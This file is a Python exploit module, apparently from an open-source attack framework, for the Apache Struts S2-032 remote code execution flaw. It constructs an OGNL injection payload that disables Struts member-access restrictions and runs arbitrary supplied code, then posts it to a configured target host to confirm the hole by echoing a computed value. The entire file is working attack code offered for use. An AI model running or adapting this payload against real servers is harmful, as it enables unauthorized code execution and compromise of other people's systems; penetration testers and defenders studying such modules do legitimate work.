#!/usr/bin/python
# -*-  coding: utf-8 -*-

##
# Current source: https://github.com/open-security/vulnpwn/
##

# from lib.base import module
from lib.core import exploit
from lib.utils import randoms
import urllib
import requests


class Module(exploit.Exploit):

    __info__ = {
        'name': 'Apache Struts S2_032 Remote Code Execution',
        'author': ['Open-Security'],
        'description': """
              This module exploits a remote command execution vulnerability in
              Apache Struts version between 2.3.20 and 2.3.28
              (except 2.3.20.2 and 2.3.24.2). Remote Code Execution can be
              performed when using REST Plugin with ! operator when
              Dynamic Method Invocation is enabled.
        """,
        'references': ['https://struts.apache.org/docs/s2-032.html'],
        'license': 'APACHE_LICENSE',
        'disclosureDate': 'Jun 01 2016',
        'options': {
            'RHOST': ['172.16.176.226', 'the target host'],
            'RPORT': [8080, 'the target port'],
            'TARGETURI': [
                '/struts2-blank/example/HelloWorld.action',
                'target uri to request'
            ]
        }
    }

    def __init__(self):
        exploit.Exploit.__init__(self)

    def generate_rce_payload(self, code):
        payload = "method:"
        payload += urllib.quote("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS")
        payload += ","
        payload += urllib.quote(code)
        payload += ","
        payload += urllib.quote("1?#xx:#request.toString")
        return payload

    def check(self):
        int_x = int(randoms.rand_text_numeric(2))
        int_y = int(randoms.rand_text_numeric(2))

        code = "#abcd=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
        code += "#abcd.print(#parameters.test[0]),"
        code += "#abcd.print(new java.lang.Integer({:d}{:d})),".format(int_x, int_y)
        code += "#abcd.print(#parameters.test[0]),"
        code += "#abcd.close()"

        payload = self.generate_rce_payload(code)
        uri = 'http://{}:{}{}'.format(
            self.rhost, self.rport, self.get_option_value('TARGETURI'))
        self.output("Exploiting - {}".format(uri))

        uri = "{}?{}".format(uri, payload)
        mark = randoms.rand_text_alpha(4)

        resp = requests.Session().post(uri, data={'test': mark})
        flag = "{}{}{}".format(mark, int_x + int_y, mark)
        if resp and resp.status_code == 200 and flag in resp.text:
            self.output("Target is vulanable")

    def main(self, *args, **kwargs):
        """custom main func for special task"""
        self.check()
